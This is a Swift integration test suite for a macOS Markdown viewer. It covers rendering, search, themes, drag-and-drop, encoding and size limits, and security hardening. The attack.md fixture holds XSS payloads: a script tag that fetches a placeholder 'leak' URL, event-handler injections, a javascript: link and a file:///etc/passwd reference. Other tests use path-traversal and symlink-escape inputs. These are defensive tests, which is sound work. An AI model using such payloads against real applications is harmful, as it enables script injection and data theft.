import AppKit
import WebKit

@MainActor
enum IntegrationTests {
    static var lines: [String] = []
    static var failures = 0
    static func check(_ condition: Bool, _ name: String) {
        lines.append("\(condition ? "PASS" : "FAIL") \(name)");if !condition{failures += 1};print(lines.last!);fflush(stdout)
    }
    static func pause(_ ms: UInt64 = 100) async {try? await Task.sleep(nanoseconds:ms*1_000_000)}
    static func eval(_ app:AppDelegate,_ script:String) async -> Any? {try? await app.web.evaluateJavaScript(script)}
    static func jsCheck(_ app:AppDelegate,_ script:String,_ name:String) async {check((await eval(app,script) as? Bool) == true,name)}
    static func wait(_ app:AppDelegate,_ script:String,timeout:Int=100) async -> Bool {
        for _ in 0..<timeout {if (await eval(app,script) as? Bool)==true{return true};await pause()};return false
    }
    static func open(_ app:AppDelegate,_ url:URL) async {
        let before=app.renderedCount;app.openDocument(url)
        for _ in 0..<100 {if app.renderedCount>before{return};await pause()}
        check(false,"render timeout: \(url.lastPathComponent)")
    }
    static func run(_ app:AppDelegate) async {
        let args=CommandLine.arguments;let base=URL(fileURLWithPath:args[args.firstIndex(of:"--self-test")!+1],isDirectory:true)
        let fixtures=base.appendingPathComponent("Artifacts/test-fixtures",isDirectory:true)
        try? FileManager.default.createDirectory(at:fixtures,withIntermediateDirectories:true)
        func write(_ name:String,_ data:Data)->URL{let url=fixtures.appendingPathComponent(name);try! data.write(to:url);return url}
        func text(_ name:String,_ value:String)->URL{write(name,Data(value.utf8))}
        let sample=base.appendingPathComponent("Examples/시작하기.md")
        let original=try! Data(contentsOf:sample)
        await open(app,sample)
        await jsCheck(app,"document.querySelectorAll('article h1').length===1 && MDView.state().headings>=7","Korean Markdown and TOC rendered")
        check(await wait(app,"document.querySelectorAll('.diagram svg').length===2"),"offline Mermaid flowchart and sequence")
        await jsCheck(app,"document.querySelector('table')!==null && document.querySelector('pre code').textContent.includes('ReadingMoment')","table and fenced Swift code")
        _=await eval(app,"MDView.search('문서'); true")
        await jsCheck(app,"MDView.state().count>3 && MDView.state().index===1","Korean search and first result")
        _=await eval(app,"MDView.next(); true")
        await jsCheck(app,"MDView.state().index===2","next search result")
        _=await eval(app,"MDView.previous(); true")
        await jsCheck(app,"MDView.state().index===1","previous search result")
        _=await eval(app,"MDView.search(''); true")
        await jsCheck(app,"document.querySelectorAll('mark').length===0","clear search restores text nodes")
        _=await eval(app,"MDView.search('존재하지않는말'); true")
        await jsCheck(app,"MDView.state().count===0","no-result search")
        app.theme="dark";app.applySettings();await pause()
        await jsCheck(app,"document.body.classList.contains('dark')","dark theme")
        await snapshot(app,base.appendingPathComponent("Artifacts/MDView-dark.png"))
        app.theme="light";app.fontSize=21;app.applySettings();await pause()
        await jsCheck(app,"!document.body.classList.contains('dark') && getComputedStyle(document.documentElement).getPropertyValue('--font')==='21px'","light theme and font size")
        app.theme="system";app.fontSize=17;app.applySettings();app.toggleSidebar();await pause()
        await jsCheck(app,"document.body.classList.contains('no-sidebar')","TOC toggle")
        app.toggleSidebar();app.applySettings()
        // Native menu opens a real sheet. Cancel must leave the current document intact.
        NSApp.mainMenu?.items[1].submenu?.performActionForItem(at:0);await pause(300)
        check(app.panel != nil,"File > Open menu opens NSOpenPanel")
        app.panel?.cancel(nil);await pause(300)
        check(app.panel == nil && app.current?.url==sample,"cancel keeps current document")
        let simple=text("새 문서.md","# 새 문서\n\n새로운 시작.")
        _=await eval(app,"MDView.search('문서'); document.querySelector('#scroller').scrollTop=9999; true")
        await open(app,simple)
        await jsCheck(app,"MDView.state().query==='' && MDView.state().scroll===0 && MDView.state().headings===1","new document resets search, scroll and TOC")
        let board=NSPasteboard.withUniqueName();board.writeObjects([sample as NSURL])
        let urls=ReaderWebView.fileURLs(board);check(urls == [sample],"Finder-style file URL pasteboard decoded")
        check(app.acceptDrop(urls),"drop accepted")
        await pause(700)
        app.acceptDrop([simple]);app.acceptDrop([sample]);app.acceptDrop([simple]);await pause(1000)
        check(app.current?.url==simple,"rapid repeated drops: latest document wins")
        check(!app.acceptDrop([]) && !app.acceptDrop([sample,simple]),"empty and multiple file drops rejected")
        let empty=text("empty.md","");await open(app,empty)
        await jsCheck(app,"document.querySelector('.empty')!==null && MDView.state().headings===0","empty document state")
        let malformed=text("malformed.md","# 불완전한 문법\n\n[링크](\n**별표\n```unknown\n<raw>")
        await open(app,malformed)
        await jsCheck(app,"document.querySelector('article').textContent.includes('<raw>')","malformed Markdown degrades safely")
        let invalid=write("invalid.md",Data([0xff,0x00,0x81]));app.openDocument(invalid);await pause(300)
        check(app.lastError != nil && app.current?.url==malformed,"invalid encoding preserves previous document")
        let utf16=write("utf16.md","# 한글 UTF16".data(using:.utf16)!);await open(app,utf16)
        await jsCheck(app,"document.querySelector('article h1').textContent==='한글 UTF16'","BOM UTF-16 support")
        let binary=text("binary.md","abc\0def");app.openDocument(binary);await pause(300)
        check(app.lastError != nil && app.current?.url==utf16,"NUL binary rejected")
        let wrong=text("wrong.html","# nope");app.openDocument(wrong);await pause(300)
        check(app.lastError != nil && app.current?.url==utf16,"unsupported extension rejected")
        let missing=fixtures.appendingPathComponent("missing.md");app.openDocument(missing);await pause(300)
        check(app.lastError != nil && app.current?.url==utf16,"missing file preserves document")
        let large=text("large.md",String(repeating:"# 큰 문서\n가나다라 긴 줄입니다.\n",count:40000));await open(app,large)
        await jsCheck(app,"document.querySelector('pre.plain')!==null && document.querySelectorAll('article h1').length===0","large file uses bounded plain rendering")
        let oversized=write("too-large.md",Data(repeating:65,count:ViewerDocument.maxBytes+1));app.openDocument(oversized);await pause(300)
        check(app.lastError != nil && app.current?.url==large,"over 8 MiB rejected, previous document kept")
        let attack=text("attack.md","""
        # 안전 테스트
        <script>window.PWNED=1;fetch('https://example.invalid/leak')</script>
        <img src="https://example.invalid/track" onerror="window.PWNED=2">
        <iframe src="https://example.invalid"></iframe>
        <svg onload="window.PWNED=3"></svg>
        [bad](javascript:alert(1))
        ![remote](https://example.invalid/track.png)
        ![file](file:///etc/passwd)
        ![svg](evil.svg)
        """)
        await open(app,attack)
        await jsCheck(app,"!window.PWNED && document.querySelectorAll('article script,article iframe,article svg').length===0","raw HTML, SVG and scripts stay inert")
        await jsCheck(app,"document.querySelectorAll('article a[href^=\"javascript:\"],article img[src^=\"http\"],article img[src^=\"file:\"]').length===0","dangerous links and remote images excluded")
        _=await eval(app,"window.networkBlocked=false;fetch('https://example.invalid/mdview-network-test').catch(()=>window.networkBlocked=true);true")
        check(await wait(app,"window.networkBlocked===true"),"CSP blocks renderer network fetch")
        let imageURL=write("한글 이미지.png",Data(base64Encoded:"iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQIHWP4z8DwHwAFgAI/ScLbtAAAAABJRU5ErkJggg==")!)
        check(LocalImage.png(imageURL.lastPathComponent,under:fixtures) != nil,"raster image decoded and re-encoded")
        check(LocalImage.resolve("../outside.png",under:fixtures)==nil,"image traversal rejected")
        check(LocalImage.resolve("/etc/passwd",under:fixtures)==nil,"absolute image rejected")
        check(LocalImage.resolve("https://example.invalid/a.png",under:fixtures)==nil,"remote image path rejected")
        check(LocalImage.resolve("evil.svg",under:fixtures)==nil,"SVG image rejected")
        let outside=base.appendingPathComponent("Artifacts/outside.png");try? Data(contentsOf:imageURL).write(to:outside)
        let symlink=fixtures.appendingPathComponent("symlink.png");try? FileManager.default.removeItem(at:symlink);try? FileManager.default.createSymbolicLink(at:symlink,withDestinationURL:outside)
        check(LocalImage.resolve("symlink.png",under:fixtures)==nil,"symlink escaping document directory rejected")
        let images=text("images.md","# 상대 이미지\n\n![한글](%ED%95%9C%EA%B8%80%20%EC%9D%B4%EB%AF%B8%EC%A7%80.png)\n\n![없음](missing.png)\n\n![밖](../outside.png)")
        await open(app,images)
        check(await wait(app,"document.querySelector('article img')?.naturalWidth===1"),"relative Korean filename image loads in WebKit")
        check(await wait(app,"document.querySelectorAll('.image-blocked').length===2"),"missing and escaping images show placeholder")
        let badMermaid=text("bad-mermaid.md","# 도식 오류\n```mermaid\ninvalid diagram !!!!\n```\n```mermaid\n%%{init: {'securityLevel':'loose'}}%%\ngraph TD\nA-->B\n```")
        await open(app,badMermaid)
        check(await wait(app,"document.querySelectorAll('.diagram-fallback').length===2"),"invalid Mermaid and config override fall back safely")
        let long=text("long.md","# 긴 내용\n\n| "+Array(repeating:"넓은 열 데이터입니다",count:25).joined(separator:" | ")+" |\n| "+Array(repeating:"---",count:25).joined(separator:" | ")+" |\n| "+Array(repeating:"값",count:25).joined(separator:" | ")+" |\n\n```\n"+String(repeating:"long_code_",count:100)+"\n```\n")
        await open(app,long)
        await jsCheck(app,"document.querySelector('.table-wrap').scrollWidth>document.querySelector('.table-wrap').clientWidth && document.querySelector('pre').scrollWidth>document.querySelector('pre').clientWidth && document.querySelector('#scroller').scrollWidth===document.querySelector('#scroller').clientWidth","long tables and code scroll locally")
        await open(app,sample);_ = await wait(app,"document.querySelectorAll('.diagram svg').length===2")
        check((try? Data(contentsOf:sample))==original,"source document byte-for-byte unchanged")
        app.theme="light";app.applySettings();await pause(200)
        await snapshot(app,base.appendingPathComponent("Artifacts/MDView-light.png"))
        _=await eval(app,"document.querySelectorAll('.diagram')[0].scrollIntoView({block:'center'}); true")
        await pause(200);await snapshot(app,base.appendingPathComponent("Artifacts/MDView-mermaid.png"))
        lines.append("\nRESULT: \(lines.filter{$0.hasPrefix("PASS")}.count) passed, \(failures) failed")
        try? lines.joined(separator:"\n").write(to:base.appendingPathComponent("Artifacts/test-results.txt"),atomically:true,encoding:.utf8)
        print(lines.last!);fflush(stdout);NSApp.terminate(nil)
    }
    static func snapshot(_ app:AppDelegate,_ url:URL) async {
        if let image=try? await app.web.takeSnapshot(configuration:nil),let tiff=image.tiffRepresentation,let rep=NSBitmapImageRep(data:tiff),let png=rep.representation(using:.png,properties:[:]){try? png.write(to:url)}
    }
}
